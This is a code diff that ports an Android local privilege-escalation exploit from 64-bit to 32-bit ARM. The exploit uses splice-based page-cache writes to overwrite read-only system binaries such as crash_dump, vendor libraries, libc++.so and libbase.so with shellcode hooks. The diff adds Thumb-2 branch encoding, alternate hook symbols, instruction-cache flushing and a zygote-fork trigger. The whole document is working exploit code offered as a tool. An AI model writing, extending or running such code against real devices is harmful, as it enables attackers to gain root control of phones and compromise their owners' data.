@@ -6,6 +6,8 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <sched.h>
+#include <signal.h>
+#include <dlfcn.h>
 #include <sys/syscall.h>
 #include <sys/types.h>
 #include <sys/socket.h>
@@ -21,7 +23,11 @@
 
 #define eos(s) (s + strlen(s))
 
+#ifdef __aarch64__
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
+#else
+static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump32";
+#endif
 static char    *libcxx_ko_target;
 
 static int      g_encap_port;
@@ -66,10 +72,17 @@ static int spawn_crash_dump(off_t offset, int write_fd, int target_fd, const cha
     if (pid < 0) { printf("vfork failed: %s\n", strerror(errno)); return -1; }
     if (pid == 0) {
         if (write_fd != target_fd && dup2(write_fd, target_fd) < 0) _exit(1);
+#ifdef __aarch64__
         if (mode)
             execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, mode, NULL);
         else
             execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
+#else
+        if (mode)
+            execl(kCrashDump, "crashdump32", offstr, libcxx_ko_target, mode, NULL);
+        else
+            execl(kCrashDump, "crashdump32", offstr, libcxx_ko_target, NULL);
+#endif
         _exit(1);
     }
     int st = 0;
@@ -139,7 +152,7 @@ static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, 
             return -1;
         }
     } else {
-        off_t off = offset;
+        off64_t off = (off64_t)offset;
         if (splice(file_fd, &off, pipe_wr, NULL, 16, SPLICE_F_MOVE) != 16) {
             printf("splice file failed: %s\n", strerror(errno)); return -1;
         }
@@ -344,10 +357,10 @@ static int patch_helper(void) {
     size_t len;
     char *buf = pad16(splice_helper_start,
                       (size_t)(splice_helper_end - splice_helper_start), &len);
-    if (!buf) { printf("patch: crash_dump64 - pad16 alloc failed\n"); return -1; }
-    printf("patch: crash_dump64 <- splicehelper (%zu bytes)\n", len);
+    if (!buf) { printf("patch: %s - pad16 alloc failed\n", kCrashDump); return -1; }
+    printf("patch: %s <- splicehelper (%zu bytes)\n", kCrashDump, len);
     int ret = patch_file_cbc(kCrashDump, buf, len, 0, 0);
-    if (ret) { free(buf); printf("patch: crash_dump64 patch failed: %d\n", ret); return ret; }
+    if (ret) { free(buf); printf("patch: %s patch failed: %d\n", kCrashDump, ret); return ret; }
 
     uint8_t verify[16];
     int vfd = open(kCrashDump, O_RDONLY);
@@ -355,7 +368,7 @@ static int patch_helper(void) {
         ssize_t n = pread(vfd, verify, 16, 16);
         close(vfd);
         if (n == 16 && memcmp(verify, buf + 16, 16) != 0) {
-            printf("patch: crash_dump64 verification failed\n");
+            printf("patch: %s verification failed\n", kCrashDump);
             printf("patch: DEVICE NOT VULNERABLE\n");
             free(buf);
             return -1;
@@ -408,10 +421,24 @@ int find_hook_target(const char *lib, const char *sym,
                      uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
                      size_t shellcode_size);
 
+#ifndef __aarch64__
+static uint32_t encode_thumb2_bw(int32_t offset) {
+    uint32_t s  = (offset >> 24) & 1;
+    uint32_t i1 = (offset >> 23) & 1;
+    uint32_t i2 = (offset >> 22) & 1;
+    uint32_t j1 = (~(i1 ^ s)) & 1;
+    uint32_t j2 = (~(i2 ^ s)) & 1;
+    uint32_t imm10 = (offset >> 12) & 0x3ff;
+    uint32_t imm11 = (offset >> 1) & 0x7ff;
+    uint16_t hw1 = 0xf000 | (s << 10) | imm10;
+    uint16_t hw2 = 0x9000 | (j1 << 13) | (j2 << 11) | imm11;
+    return hw1 | ((uint32_t)hw2 << 16);
+}
+#endif
+
 static int patch_hook(const char *lib, const char *sym,
                       char *stage_data, uint32_t stage_len, char *stage_start,
                       char *first_inst_copy, struct PatchRestore *restore) {
-    const uint32_t BRANCH = 0x14000000;
     uint32_t start_delta = (uint32_t)(stage_start - stage_data);
 
     size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
@@ -427,15 +454,27 @@ static int patch_hook(const char *lib, const char *sym,
     if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, padded)) {
         printf("failed to find offsets for %s\n", lib); free(buf); return 1;
     }
-    printf("Found: hook=0x%lx shellcode=0x%lx len=%u\n", hook_off, shell_off, stage_len);
+    printf("Found: hook=0x%lx shellcode=0x%lx len=%u\n",
+           (unsigned long)hook_off, (unsigned long)shell_off, stage_len);
 
+#ifdef __aarch64__
+    const uint32_t BRANCH = 0x14000000;
     uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);
+#else
+    uint32_t hook_insn = encode_thumb2_bw(
+        (int32_t)((shell_off + start_delta) - (hook_off + 4)));
+#endif
 
     if (first_insn == hook_insn) {
         printf("%s already patched\n", lib); free(buf); return 0;
     }
+#ifdef __aarch64__
     uint32_t jmpback = BRANCH |
         (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
+#else
+    uint32_t jmpback = encode_thumb2_bw(
+        (int32_t)((hook_off + 4) - (shell_off + stage_len)));
+#endif
     *(uint32_t *)&buf[stage_len - 4] = jmpback;
     *(uint32_t *)&buf[first_inst_copy - stage_data] = first_insn;
 
@@ -482,11 +521,19 @@ static int createOrphanProcess(void) {
 }
 
 static const char *detect_ko_target(void) {
+#ifdef __aarch64__
     static const char *const candidates[] = {
         "/vendor/lib64/libbinderdebug.so",
         "/vendor/lib64/libstagefrighthw.so",
         "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
     };
+#else
+    static const char *const candidates[] = {
+        "/vendor/lib/libbinderdebug.so",
+        "/vendor/lib/libstagefrighthw.so",
+        "/vendor/lib/libstagefright_aidl_bufferpool2.so",
+    };
+#endif
     for (size_t i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
         if (access(candidates[i], F_OK) == 0)
             return candidates[i];
@@ -555,24 +602,61 @@ static int exploit(void) {
     int rc = 3;
     if (patch_helper()) goto done;
     if (patch_ko()) goto done;
+#ifdef __aarch64__
     int hook_rc = patch_hook("/system/lib64/libc++.so",
                              "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                              libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                              &g_libcxx_r);
-    /* Target selection returns 1 before writing. libbase's logging destructor
-     * also runs when init reaps an orphan, and may have more executable slack. */
     if (hook_rc == 1)
         hook_rc = patch_hook("/system/lib64/libbase.so",
                              "_ZN7android4base10LogMessageD1Ev",
                              libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                              &g_libcxx_r);
+#else
+    int hook_rc = patch_hook("/system/lib/libc++.so",
+                             "_Znwj",
+                             libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
+                             &g_libcxx_r);
+    if (hook_rc == 1)
+        hook_rc = patch_hook("/system/lib/libc++.so",
+                             "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
+                             libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
+                             &g_libcxx_r);
+#endif
     if (hook_rc) goto done;
 
     rc = 2;
     usleep(500000);
-    
+
     printf("\n=== init  ===\n");
+#ifdef __aarch64__
     createOrphanProcess();
+#else
+    {
+        void *h = dlopen("/system/lib/libc++.so", RTLD_NOW);
+        if (h) {
+            void *sym = dlsym(h, "_Znwj");
+            if (sym) {
+                long pgsz = sysconf(_SC_PAGESIZE);
+                uintptr_t pg = (uintptr_t)sym & ~(uintptr_t)(pgsz - 1);
+                __builtin___clear_cache((char *)pg, (char *)(pg + pgsz));
+                printf("icache flushed (all cores via ICIMVAU)\n");
+            }
+            dlclose(h);
+        }
+    }
+    {
+        int pid = fork();
+        if (pid == 0) {
+            execl("/system/bin/am", "am", "start",
+                  "-a", "android.settings.SETTINGS", NULL);
+            _exit(1);
+        }
+        if (pid > 0) TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
+        printf("triggered zygote fork via am start\n");
+    }
+    createOrphanProcess();
+#endif
 
     static const struct {
         const char *path;
